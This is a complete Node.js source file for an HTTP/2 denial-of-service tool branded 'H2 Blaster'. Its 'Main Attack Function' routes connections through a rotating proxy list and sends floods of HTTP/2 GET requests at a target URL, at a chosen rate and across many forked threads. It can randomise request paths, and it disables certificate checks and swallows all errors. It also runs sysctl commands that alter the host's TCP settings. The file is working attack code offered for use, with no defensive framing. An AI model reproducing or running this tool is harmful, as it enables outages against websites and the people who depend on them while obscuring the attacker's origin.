// Required Modules
const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const randstr = require('randomstring');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const { exec } = require('child_process');
const chalk = require('chalk');
const figlet = require('figlet');
const cliProgress = require('cli-progress');
const { setsockopt } = require('sockopt');

// Increase Max Listeners
require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
process.setMaxListeners(0);

// Handle Uncaught Exceptions
process.on('uncaughtException', function (e) {});
process.on('unhandledRejection', function (e) {});

// Constants
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const target = process.argv[2];
const time = process.argv[3];
const ratelimit = process.argv[4];
const threads = process.argv[5];
const proxyfile = process.argv[6];
const useRandomSuffix = process.argv[7] === 'rand';
const url = new URL(target);

// Read Proxy List
const proxies = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n');

// CLI Enhancements
function showBanner() {
    console.clear();
    console.log(
        chalk.cyan(
            figlet.textSync('H2 Blaster', { horizontalLayout: 'full' })
        )
    );
    console.log(chalk.magentaBright('→ High-Speed HTTP/2 Over TLS Engine'));
    console.log(chalk.green(`→ Target: ${target}`));
    console.log(chalk.blue(`→ Duration: ${time}s | Threads: ${threads} | RPS: ${ratelimit}`));
    console.log(chalk.gray(`→ Proxies loaded: ${proxies.length}`));
    console.log(chalk.yellow('='.repeat(80)));
}

let packetsSent = 0;
let successfulConnections = 0;
let failedConnections = 0;
let bar;

function initProgressBar() {
    bar = new cliProgress.SingleBar({
        format: chalk.whiteBright('Packets Sent') + ' |' + chalk.cyan('{bar}') + '| {value}',
        barCompleteChar: '\u2588',
        barIncompleteChar: '\u2591',
        hideCursor: true
    });
    bar.start(0, 0);
}

function updateStats(success) {
    packetsSent++;
    if (success) {
        successfulConnections++;
    } else {
        failedConnections++;
    }
    bar.update(packetsSent);
}

// Encode Frame
function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload]);
    return frame;
}

// Decode Frame
function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    const flags = data.readUint8(4);
    const streamId = data.readUInt32BE(5);
    const offset = flags & 0x20 ? 5 : 0;

    let payload = Buffer.alloc(0);

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length);
        if (payload.length + offset != length) {
            return null;
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    };
}

// Encode Settings
function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}

// Generate Random String
function generateRandomString() {
    return randstr.generate({
        "charset": "123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM",
        "length": 8
    });
}

// Main Attack Function
function attack() {
    const [proxyHost, proxyPort] = proxies[Math.floor(Math.random() * proxies.length)].split(':');

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
            setsockopt(netSocket, 6, 3, 1);
            setsockopt(netSocket, 6, 1, 1);
            setsockopt(netSocket, 1, 7, 1000000);
            setsockopt(netSocket, 1, 8, 1000000);

            const tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: ['h2', 'http/1.1'],
                servername: url.host,
                ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384',
                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL,
                secure: true,
                rejectUnauthorized: false
            }, () => {
                let streamId = 1;
                let data = Buffer.alloc(0);
                let hpack = new HPACK();
                hpack.setTableSize(4096);

                const updateWindow = Buffer.alloc(4);
                updateWindow.writeUInt32BE(15663105, 0);

                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        [1, 262144],
                        [2, 0],
                        [4, 6291455],
                        [6, 65535],
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData]);

                    while (data.length >= 9) {
                        const frame = decodeFrame(data);
                        if (frame != null) {
                            data = data.subarray(frame.length + 9);
                            if (frame.type === 4 && frame.flags === 0) {
                                tlsSocket.write(encodeFrame(0, 4, "", 1));
                            }
                            if (frame.type === 7 || frame.type === 5) {
                                tlsSocket.end(() => tlsSocket.destroy());
                            }
                        } else {
                            break;
                        }
                    }
                });

                tlsSocket.write(Buffer.concat(frames));

                function sendRequest() {
                    if (tlsSocket.destroyed) {
                        return;
                    }

                    const headers = Object.entries({
                        ":method": "GET",
                        ":authority": url.hostname,
                        ":scheme": "https",
                        ":path": url.pathname.replace("[rand]", useRandomSuffix ? generateRandomString() : ""),
                        "user-agent": `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36`,
                        "accept": "*/*",
                        "accept-encoding": "gzip, deflate, br",
                        "accept-language": "en-US,en;q=0.9",
                    });

                    const packed = Buffer.concat([
                        Buffer.from([0x80, 0, 0, 0, 0xFF]),
                        hpack.encode(headers)
                    ]);

                    tlsSocket.write(Buffer.concat([encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20)]));
                    streamId += 2;

                    updateStats(true);

                    setTimeout(() => {
                        sendRequest();
                    }, 1000 / ratelimit);
                }

                sendRequest();
            }).on('error', () => {
                tlsSocket.destroy();
                updateStats(false);
            });
        });
        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
    }).once('error', () => {
        updateStats(false);
    }).once('close', () => {
        attack();
    });
}

// TCP Configuration Changes
function configureTCP() {
    const congestionControlOptions = ['cubic', 'reno', 'bbr', 'dctcp', 'hybla'];
    const sackOptions = ['1', '0'];
    const windowScalingOptions = ['1', '0'];
    const timestampsOptions = ['1', '0'];
    const selectiveAckOptions = ['1', '0'];
    const tcpFastOpenOptions = ['3', '2', '1', '0'];

    const congestionControl = congestionControlOptions[Math.floor(Math.random() * congestionControlOptions.length)];
    const sack = sackOptions[Math.floor(Math.random() * sackOptions.length)];
    const windowScaling = windowScalingOptions[Math.floor(Math.random() * windowScalingOptions.length)];
        const timestamps = timestampsOptions[Math.floor(Math.random() * timestampsOptions.length)];
    const selectiveAck = selectiveAckOptions[Math.floor(Math.random() * selectiveAckOptions.length)];
    const tcpFastOpen = tcpFastOpenOptions[Math.floor(Math.random() * tcpFastOpenOptions.length)];

    exec(`sysctl -w net.ipv4.tcp_congestion_control=${congestionControl}`, () => {});
    exec(`sysctl -w net.ipv4.tcp_sack=${sack}`, () => {});
    exec(`sysctl -w net.ipv4.tcp_window_scaling=${windowScaling}`, () => {});
    exec(`sysctl -w net.ipv4.tcp_timestamps=${timestamps}`, () => {});
    exec(`sysctl -w net.ipv4.tcp_dsack=${selectiveAck}`, () => {});
    exec(`sysctl -w net.ipv4.tcp_fastopen=${tcpFastOpen}`, () => {});
}

// Entry Point
if (cluster.isMaster) {
    showBanner();
    initProgressBar();
    configureTCP();

    console.log(chalk.green(`\nLaunching ${threads} threads...`));
    console.log(chalk.gray('='.repeat(80)));

    for (let i = 0; i < threads; i++) {
        cluster.fork();
    }

    // Timed shutdown
    setTimeout(() => {
        bar.stop();
        console.log(chalk.green('\n[✓] Completed.'));
        console.log(chalk.whiteBright(`→ Packets Sent: ${packetsSent}`));
        console.log(chalk.greenBright(`→ Success: ${successfulConnections}`));
        console.log(chalk.redBright(`→ Failures: ${failedConnections}`));
        process.exit(0);
    }, time * 1000);

} else {
    attack();
}